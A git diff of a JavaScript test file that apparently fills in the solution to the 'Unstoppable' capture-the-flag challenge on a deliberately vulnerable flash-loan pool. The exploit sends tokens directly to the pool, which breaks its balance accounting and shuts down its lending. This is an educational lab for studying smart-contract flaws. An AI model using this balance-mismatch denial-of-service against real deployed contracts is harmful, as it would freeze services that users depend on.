@@ -33,13 +33,28 @@ describe('[Challenge] Unstoppable', function () {
             await this.token.balanceOf(attacker)
         ).to.be.bignumber.equal(INITIAL_ATTACKER_BALANCE);
 
-         // Show it's possible for anyone to take out a flash loan
-         this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
-         await this.receiverContract.executeFlashLoan(10, { from: someUser });
+        // Show it's possible for anyone to take out a flash loan
+        this.receiverContract = await ReceiverContract.new(this.pool.address, { from: someUser });
+        await this.receiverContract.executeFlashLoan(10, { from: someUser });
     });
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        const beforeBalance = await this.pool.poolBalance()
+        console.log("Before balance is ", beforeBalance)
+        const someUserBalance = await this.token.balanceOf(attacker)
+        console.log("Some user balance is ", someUserBalance.toString())
+
+        // This wont work because depositTokens function increases poolBalance
+        /*await this.token.approve(this.pool.address, INITIAL_ATTACKER_BALANCE, { from: attacker })
+        await this.pool.depositTokens(INITIAL_ATTACKER_BALANCE, { from: attacker })*/
+
+        await this.token.transfer(this.pool.address, 10, { from: attacker })
+
+        const afterBalance = await this.pool.poolBalance()
+        console.log("After balance is", afterBalance.toString())
+
+
     });
 
     after(async function () {
